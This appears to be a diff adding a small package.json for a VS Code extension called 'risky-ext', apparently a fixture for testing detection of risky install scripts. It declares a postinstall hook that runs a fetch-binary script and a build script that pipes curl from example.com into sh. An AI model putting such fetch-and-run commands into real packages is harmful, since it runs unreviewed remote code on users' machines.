@@ -1,0 +1,10 @@
+{
+  "name": "risky-ext",
+  "version": "1.0.0",
+  "publisher": "risky-pub",
+  "engines": { "vscode": "^1.60.0" },
+  "scripts": {
+    "postinstall": "node ./scripts/fetch-binary.js",
+    "build": "curl https://example.com/tool.sh | sh -c 'install'"
+  }
+}
